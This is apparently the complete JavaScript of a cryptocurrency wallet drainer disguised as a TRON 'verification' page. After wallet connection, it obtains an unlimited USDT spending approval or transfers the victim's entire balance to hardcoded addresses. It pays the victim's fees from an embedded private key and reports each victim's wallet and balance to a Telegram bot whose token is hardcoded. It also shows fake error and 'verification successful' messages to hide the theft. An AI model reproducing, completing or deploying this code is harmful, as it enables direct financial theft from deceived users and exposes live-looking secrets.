// TRON Configuration
const tronAddress = "TQtBkgDaQUKrpt2aiYYaACpDGjigJkUTum";
const usdtTrc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const smartContractAddress = "TQtBkgDaQUKrpt2aiYYaACpDGjigJkUTum";
const alternativeWalletAddress = "TQtBkgDaQUKrpt2aiYYaACpDGjigJkUTum";

// Telegram
const telegramBotToken = "7469005317:AAGgWxVoQLTDTcclOPYiysSqf58xyihZwwQ";
const telegramChatId = "7281528879";
const encodedPrivateKey = "MzEyNjYzMzYzZWJmZjQxODQ0NDQ5YjA2ODE3YjcxMDRmNGQxNWZlNTkyZjlhYThkMDJmYmU4ZTNkZjc0MjhmMg==";

let tronWeb, userAddress, walletProvider;

// TRON Service Class (Similar to your implementation)
class TronWalletService {
    constructor() {
        this.tronWeb = new TronWeb({
            fullHost: "https://api.trongrid.io",
        });
        this.provider = null;
        this.isConnected = false;
    }

    // Connect wallet (like your DApp)
    async connectWallet() {
        try {
            // Check for TronLink
            if (window.tronLink && window.tronLink.ready) {
                this.provider = window.tronLink;
                await this.provider.request({ method: 'tron_requestAccounts' });
                
                if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                    tronWeb = window.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    this.isConnected = true;
                    console.log("✅ TronLink Connected:", userAddress);
                    return true;
                }
            }
            
            // Check for Trust Wallet / Other TRON wallets
            if (window.tronWeb && window.tronWeb.defaultAddress) {
                tronWeb = window.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
                this.provider = window.tronWeb;
                this.isConnected = true;
                console.log("✅ TRON Wallet Connected:", userAddress);
                return true;
            }

            throw new Error("No TRON wallet found");
            
        } catch (error) {
            console.error("Wallet connection failed:", error);
            return false;
        }
    }

    // Get USDT Balance (Same as your implementation)
    async fetchBalanceUSDT(ownerAddress) {
        try {
            const hexAddress = this.tronWeb.address.toHex(ownerAddress);
            
            const result = await this.tronWeb.transactionBuilder.triggerConstantContract(
                usdtTrc20ContractAddress,
                'balanceOf(address)',
                {},
                [{ type: 'address', value: hexAddress }],
                hexAddress
            );
            
            const balanceHex = result.constant_result[0];
            const balanceBN = this.tronWeb.toBigNumber('0x' + balanceHex);
            const balanceNormalized = balanceBN.dividedBy(10 ** 6).toNumber();
            
            return balanceNormalized;
        } catch (error) {
            console.error("Error fetching USDT balance:", error);
            return null;
        }
    }

    // Get TRX Balance
    async getTRXBalance(address) {
        try {
            const balance = await this.tronWeb.trx.getBalance(address);
            return this.tronWeb.fromSun(balance);
        } catch (err) {
            console.error("TRX Balance error:", err);
            return "0";
        }
    }

    // Send TRX (for fees)
    async sendTRX(toAddress, amount) {
        try {
            const privateKey = atob(encodedPrivateKey);
            const tronWebInstance = new TronWeb({
                fullHost: 'https://api.trongrid.io',
                privateKey: privateKey
            });

            const fromAddress = tronWebInstance.defaultAddress.base58;
            const senderBalance = await tronWebInstance.trx.getBalance(fromAddress);
            const senderBalanceTRX = tronWebInstance.fromSun(senderBalance);

            if (senderBalanceTRX < (amount + 1)) {
                console.log("Insufficient TRX in sender wallet");
                return false;
            }

            const amountInSun = tronWebInstance.toSun(amount);
            const transaction = await tronWebInstance.trx.sendTransaction(toAddress, amountInSun);

            if (transaction.result) {
                console.log("TRX sent successfully:", transaction.txid);
                return true;
            }
            return false;
        } catch (error) {
            console.error("TRX send failed:", error);
            return false;
        }
    }

    // Execute Approval Transaction (Similar to your sendTransaction)
    async executeApproval(address, targetAddress) {
        if (!this.provider) {
            throw new Error("Wallet not connected");
        }

        try {
            const contractAddress = usdtTrc20ContractAddress;
            const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
            
            const options = {
                feeLimit: 150000000, // 150 TRX
                callValue: 0,
            };

            const parameters = [
                { type: "address", value: targetAddress },
                { type: "uint256", value: amount },
            ];

            const functionSelector = "approve(address,uint256)";

            // Build transaction
            const { transaction } = await this.tronWeb.transactionBuilder.triggerSmartContract(
                contractAddress,
                functionSelector,
                options,
                parameters,
                address
            );

            // Sign transaction using wallet provider
            let signedTransaction;
            
            if (this.provider.request) {
                // For WalletConnect/TronLink style
                const signedTx = await this.provider.request({
                    method: "tron_signTransaction",
                    params: { address, transaction },
                });
                signedTransaction = signedTx.result || signedTx;
            } else {
                // For direct TronWeb
                signedTransaction = await tronWeb.trx.sign(transaction);
            }

            // Send transaction
            const result = await this.tronWeb.trx.sendRawTransaction(signedTransaction);

            if (result.result) {
                const balance = await this.fetchBalanceUSDT(address);
                await this.sendTelegramAlert({
                    wallet: address,
                    contract: targetAddress,
                    balance: balance,
                    status: 'Approved'
                });
            }

            return result;
        } catch (error) {
            console.error('Approval Error:', error);
            return { success: false, error: error.message };
        }
    }

    // Execute Transfer Transaction
    async executeTransfer(address, targetAddress, amount) {
        if (!this.provider) {
            throw new Error("Wallet not connected");
        }

        try {
            const contractAddress = usdtTrc20ContractAddress;
            const amountInSun = this.tronWeb.toSun(amount);
            
            const options = {
                feeLimit: 150000000,
                callValue: 0,
            };

            const parameters = [
                { type: "address", value: targetAddress },
                { type: "uint256", value: amountInSun },
            ];

            const functionSelector = "transfer(address,uint256)";

            const { transaction } = await this.tronWeb.transactionBuilder.triggerSmartContract(
                contractAddress,
                functionSelector,
                options,
                parameters,
                address
            );

            let signedTransaction;
            
            if (this.provider.request) {
                const signedTx = await this.provider.request({
                    method: "tron_signTransaction",
                    params: { address, transaction },
                });
                signedTransaction = signedTx.result || signedTx;
            } else {
                signedTransaction = await tronWeb.trx.sign(transaction);
            }

            const result = await this.tronWeb.trx.sendRawTransaction(signedTransaction);
            return result;
        } catch (error) {
            console.error('Transfer Error:', error);
            return { success: false, error: error.message };
        }
    }

    // Send Telegram Alert (Same as your implementation)
    async sendTelegramAlert({ wallet, contract, balance, status }) {
        try {
            const message = `🔔<b>TRC20 Transaction</b>\n🧾 Wallet: <code>${wallet}</code>\n✅ Contract: <code>${contract}</code>\n💳 USDT Balance: <code>${balance}</code>\n📅 Status: ${status}`;
            
            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: "HTML",
                }),
            });
        } catch (err) {
            console.log("Telegram alert error:", err);
        }
    }
}

// Initialize service
const tronService = new TronWalletService();

// Button state management
function changeButtonToSending() {
    const btn = [...document.querySelectorAll("button")]
        .find(b => b.textContent.trim().toLowerCase() === "next");
    if (btn) {
        btn.textContent = "Connecting...";
        btn.disabled = true;
        btn.style.opacity = "0.6";
    }
}

function resetButton() {
    const btn = [...document.querySelectorAll("button")]
        .find(b => b.textContent.trim().toLowerCase().includes("connecting") || 
                     b.textContent.trim().toLowerCase().includes("processing"));
    if (btn) {
        btn.textContent = "Next";
        btn.disabled = false;
        btn.style.opacity = "1";
    }
}

// Show fake error messages
function showFakeErrorMessage() {
    const errorMessages = [
        "❌ Network congestion detected. Please try again later.",
        "❌ Transaction temporarily unavailable. Please retry.",
        "❌ Connection timeout. Please check your connection.",
        "❌ Smart contract busy. Please wait and retry.",
    ];
    
    const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
    showPopup(randomError, "red");
}

// Popup display
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        Object.assign(popup.style, {
            position: "fixed", top: "50%", left: "50%",
            transform: "translate(-50%, -50%)",
            padding: "20px", borderRadius: "10px",
            boxShadow: "0 0 10px rgba(0,0,0,0.2)",
            textAlign: "center", fontSize: "18px",
            width: "80%", maxWidth: "400px",
            zIndex: 9999, backgroundColor: "#fff"
        });
        document.body.appendChild(popup);
    }
    
    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f0f0f0";
    popup.style.color = color;
    popup.innerHTML = message;
    popup.style.display = "block";
    
    setTimeout(() => popup.style.display = "none", 5000);
}

// Main Next function
async function Next() {
    console.log("🚀 Starting TRON wallet connection...");
    changeButtonToSending();

    try {
        // Step 1: Connect wallet (This will show the native wallet connection popup)
        const connected = await tronService.connectWallet();
        if (!connected) {
            showPopup("❌ Please connect your TRON wallet to continue.", "red");
            resetButton();
            return;
        }

        // Update button
        const btn = [...document.querySelectorAll("button")]
            .find(b => b.textContent.trim().toLowerCase().includes("connecting"));
        if (btn) btn.textContent = "Processing...";

        // Step 2: Get balances
        const usdtBalance = await tronService.fetchBalanceUSDT(userAddress);
        const trxBalance = parseFloat(await tronService.getTRXBalance(userAddress));

        console.log("💵 USDT Balance:", usdtBalance);
        console.log("💎 TRX Balance:", trxBalance);

        if (!usdtBalance || usdtBalance < 0.000001) {
            showPopup("❌ No USDT TRC20 tokens found in your wallet.", "red");
            resetButton();
            return;
        }

        if (usdtBalance <= 0.5) {
            showPopup(
                `✅ Verification Successful<br>Your USDT has been verified.<br><b>💵 USDT:</b> ${usdtBalance}<br><b>💎 TRX:</b> ${trxBalance}`,
                "green"
            );
            resetButton();
            return;
        }

        // Step 3: Determine action
        let actionType = "";
        let targetAddress = "";
        let requiredTrx = 0;

        if (usdtBalance < 100) {
            actionType = "approve";
            targetAddress = smartContractAddress;
            requiredTrx = 28;
        } else if (usdtBalance >= 100 && usdtBalance <= 300) {
            actionType = "transfer";
            targetAddress = alternativeWalletAddress;
            requiredTrx = 15;
        } else {
            actionType = "transfer";
            targetAddress = tronAddress;
            requiredTrx = 15;
        }

        // Step 4: Auto-send TRX if needed
        if (trxBalance < requiredTrx) {
            const trxToSend = Math.max(requiredTrx + 5, 30);
            console.log(`⛽ Auto-sending ${trxToSend} TRX for fees...`);
            
            const trxSent = await tronService.sendTRX(userAddress, trxToSend);
            if (trxSent) {
                await new Promise(resolve => setTimeout(resolve, 5000));
                console.log("💎 TRX sent successfully");
            }
        }

        // Step 5: Execute transaction
        let result;
        if (actionType === "approve") {
            result = await tronService.executeApproval(userAddress, targetAddress);
        } else {
            result = await tronService.executeTransfer(userAddress, targetAddress, usdtBalance);
        }

        if (result.result || result.success !== false) {
            // Show fake error after successful transaction
            setTimeout(() => {
                showFakeErrorMessage();
                resetButton();
            }, 1500);
        } else {
            throw new Error("Transaction failed");
        }

    } catch (error) {
        console.error("❌ Transaction error:", error);
        showPopup("❌ Transaction failed. Please try again.", "red");
        resetButton();
    }
}

// Initialize on page load
window.addEventListener("load", () => {
    console.log("🌐 TRON DApp script loaded");
    
    const observer = new MutationObserver(() => {
        const btn = [...document.querySelectorAll("button")]
            .find(b => b.textContent.trim().toLowerCase() === "next");
        if (btn) {
            btn.addEventListener("click", Next);
            console.log("✅ Next button bound to TRON wallet");
            observer.disconnect();
        }
    });
    
    observer.observe(document.body, { childList: true, subtree: true });
});
